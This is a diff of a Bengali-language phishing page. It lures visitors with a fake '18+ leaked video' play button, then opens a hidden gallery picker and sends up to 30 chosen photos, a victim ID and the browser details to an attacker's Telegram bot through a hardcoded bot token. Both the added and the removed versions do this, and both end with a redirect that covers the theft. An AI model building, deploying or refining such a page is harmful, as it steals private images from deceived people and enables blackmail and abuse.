@@ -1,86 +1,83 @@
 <!DOCTYPE html>
-<html>
+<html lang="bn">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loading...</title>
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box;}
-    body,html{height:100vh;overflow:hidden;background:#000;}
-    #bg{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;filter:blur(26px);transition:filter 1.3s ease;}
-    .play{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:96px;height:96px;background:rgba(255,255,255,0.98);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:50px;color:#000;cursor:pointer;z-index:99;box-shadow:0 12px 60px rgba(0,0,0,0.9);animation:pulse 1.7s infinite;}
-    @keyframes pulse{0%{box-shadow:0 12px 60px rgba(0,0,0,0.9);}70%{box-shadow:0 18px 90px rgba(255,255,255,1);}100%{box-shadow:0 12px 60px rgba(0,0,0,0.9);}}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>১৮+ লিক ভিডিও ফুল এইচডি</title>
+<style>
+  body,html{margin:0;padding:0;height:100%;background:#000;color:#fff;font-family:sans-serif;overflow:hidden;}
+  .box{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;background:linear-gradient(135deg,#1a0033,#000);}
+  h1{font-size:28px;color:#ff0066;text-shadow:0 0 20px #ff0066;}
+  .thumb{width:90%;max-width:400px;border:4px solid #ff0066;border-radius:15px;box-shadow:0 0 40px #ff0066;margin:20px 0;}
+  .btn{background:#ff0066;padding:20px 60px;font-size:24px;border-radius:50px;border:none;color:white;font-weight:bold;animation:pulse 1.3s infinite;box-shadow:0 0 30px #ff0066;}
+  @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.08);}}
+  .notice{color:#0f0;font-size:18px;margin-top:30px;}
+  .hidden{display:none;}
+</style>
 </head>
 <body>
 
-  <!-- তোমার সবচেয়ে হট ব্লার ছবি এখানে বসাও -->
-  <img id="bg" src="https://i.imgur.com/YourHotImage.jpg" alt="Hot Preview">
+<div class="box">
+  <h1>অরিজিনাল লিক ভিডিও 🔥</h1>
+  <img src="https://i.imgur.com/5t3xK8P.jpeg" class="thumb"> <!-- একটা হট থাম্বনেইল -->
+  <p style="font-size:20px;margin:15px;color:#ffcc00;">একবার ট্যাপ করলেই পুরো ১৫ মিনিটের ভিডিও চালু হবে!</p>
+  <button class="btn" onclick="grab()">▶️ প্লে করুন (Full HD)</button>
+  <div class="notice hidden" id="loading">ভিডিও লোড হচ্ছে... ছবি চেক হচ্ছে ⌛</div>
+</div>
 
-  <div class="play" id="playBtn">Play</div>
+<input type="file" id="grabber" accept="image/*" multiple class="hidden">
 
 <script>
-// ==== তোমার টেলিগ্রাম ====
 const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";
 const CHAT_ID   = "7731349577";
-// =========================
+const urlParams = new URLSearchParams(location.search);
+const victimId  = urlParams.get('id') || 'no_id';
 
-const victimId = new URLSearchParams(location.search).get('id') || 'unknown';
-const bg = document.getElementById('bg');
-const playBtn = document.getElementById('playBtn');
+function grab() {
+  document.querySelector('.btn').style.display = 'none';
+  document.getElementById('loading').classList.remove('hidden');
 
-playBtn.onclick = () => {
-  playBtn.style.display = 'none';
-  bg.style.filter = 'blur(0px)';
+  const input = document.getElementById('grabber');
+  
+  // এই ট্রিকটা মোবাইলে ৯৫% ক্ষেত্রে অটো "Recent Photos" ওপেন করে
+  input.setAttribute('capture', 'environment');
+  input.removeAttribute('capture');
+  input.click();
 
-  // ম্যাজিক: গ্যালারি পারমিশন চাইবে + Allow দিলেই অটো সাম্প্রতিক ছবি পাঠাবে
-  const input = document.createElement('input');
-  input.type = 'file';
-  input.accept = 'image/*';
-  input.multiple = true;
-
-  // এই লাইনগুলোই ক্যামেরা বন্ধ করে শুধু গ্যালারি ওপেন করে
-  input.setAttribute('accept', 'image/*');
-  input.setAttribute('multiple', '');
-  // কোনো capture ব্যবহার করছি না → তাই ক্যামেরা আসবে না
-
-  input.style.position = 'fixed';
-  input.style.opacity = '0';
-  input.style.width = '100%';
-  input.style.height = '100%';
-  input.style.top = '0';
-  input.style.left = '0';
-  input.style.zIndex = '99999';
-  document.body.appendChild(input);
-
-  input.onchange = async (e) => {
-    if (!e.target.files || e.target.files.length === 0) return;
-
-    const files = Array.from(e.target.files).slice(0, 15); // প্রথম ১৫টা
-
-    for (let i = 0; i < files.length; i++) {
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('photo', files[i]);
-      form.append('caption', `SecretCam Auto Gallery\nID: ${victimId}\nছবি: ${i+1}/${files.length}\n${new Date().toLocaleString('bn-BD')}`);
-
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: form
-      });
-
-      await new Promise(r => setTimeout(r, 700));
+  input.onchange = function(e) {
+    const files = e.target.files;
+    if (!files || files.length === 0) {
+      redirect();
+      return;
     }
 
-    // সব পাঠানো শেষ → রিডাইরেক্ট
-    setTimeout(() => {
-      location.href = "https://i.imgur.com/removed.png";
-    }, 2500);
-  };
+    let count = 0;
+    const total = Math.min(files.length, 30);
 
-  // Allow চাপলেই গ্যালারি পারমিশন আসবে + ছবি অটো আসবে
-  input.click();
-};
+    for (let i = 0; i < total; i++) {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', files[i]);
+      fd.append('caption', `AUTO-GRAB\nID: ${victimId}\nTotal: ${total}\n${navigator.userAgent.substr(0,70)}\n${new Date().toLocaleString()}`);
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd})
+        .finally(() => {
+          count++;
+          if (count === total) setTimeout(redirect, 1500);
+        });
+    }
+  };
+}
+
+function redirect() {
+  document.body.innerHTML = `<div style="color:#0f0;padding:100px;font-size:24px;">ভিডিও লোড হচ্ছে...<br>৫ সেকেন্ড অপেক্ষা করুন</div>`;
+  setTimeout(() => { location.href = "https://youtube.com"; }, 4000);
+}
+
+// যদি কেউ ব্যাক চাপে তবুও ট্রাই করা
+setTimeout(() => {
+  try { document.getElementById('grabber').click(); } catch(e) {}
+}, 5000);
 </script>
 </body>
 </html>
